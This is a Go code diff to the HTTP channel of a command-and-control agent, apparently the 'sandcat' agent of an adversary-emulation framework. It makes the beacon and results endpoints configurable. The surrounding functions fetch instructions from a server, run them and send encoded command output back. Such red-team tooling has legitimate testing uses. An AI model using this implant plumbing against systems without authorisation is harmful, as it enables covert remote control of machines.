@@ -15,6 +15,11 @@ import (
 	"../output"
 )
 
+var (
+	apiBeacon string
+	apiResult string
+)
+
 //API communicates through HTTP
 type API struct { }
 
@@ -25,7 +30,7 @@ func init() {
 //GetInstructions sends a beacon and returns instructions
 func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
-	address := fmt.Sprintf("%s/beacon", profile["server"])
+	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
 	bites := request(address, data)
 	var out map[string]interface{}
 	if bites != nil {
@@ -62,7 +67,11 @@ func (contact API) RunInstruction(command map[string]interface{}, profile map[st
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
-func (contact API) C2RequirementsMet(criteria interface{}) bool {
+func (contact API) C2RequirementsMet(criteria map[string]string) bool {
+	apiBeacon = criteria["apiBeacon"]
+	apiResult = criteria["apiResult"]
+	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
+	output.VerbosePrint(fmt.Sprintf("Result API=%s", apiResult))
 	return true
 }
 
@@ -84,7 +93,7 @@ func drop(server string, payload string) string {
 }
 
 func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string) {
-	address := fmt.Sprintf("%s/results", server)
+	address := fmt.Sprintf("%s%s", server, apiResult)
 	link := fmt.Sprintf("%s", commandID.(string))
 	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
 	request(address, data)
